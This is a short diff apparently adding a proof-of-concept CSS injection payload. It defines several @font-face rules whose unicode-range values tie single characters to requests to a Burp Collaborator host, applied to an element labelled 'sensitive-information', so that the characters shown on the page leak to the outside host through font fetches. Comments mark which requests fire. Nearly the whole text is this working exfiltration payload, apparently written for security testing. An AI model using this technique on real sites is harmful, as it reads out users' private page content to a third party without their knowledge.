@@ -1,6 +1,21 @@
-@font-face {
-   font-family:'TestFont';
-   src:url('https://1km6k367djxehgb8rgoutndkwb21qq.burpcollaborator.net/testfont.ttf');
-   font-weight:'normal';
-   font-style:'normal';
- }
+<style>
+@font-face{
+ font-family:poc;
+ src: url(https://vjijs28zeotxjrvf7omr047ik9qzeo.burpcollaborator.net/?A); /* fetched */
+ unicode-range:U+0041;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://vjijs28zeotxjrvf7omr047ik9qzeo.burpcollaborator.net/?B); /* fetched too */
+ unicode-range:U+0042;
+}
+@font-face{
+ font-family:poc;
+ src: url(https://vjijs28zeotxjrvf7omr047ik9qzeo.burpcollaborator.net/?C); /* not fetched */
+ unicode-range:U+0043;
+}
+#sensitive-information{
+ font-family:poc;
+}
+</style>
+<p id="sensitive-information">AB</p>
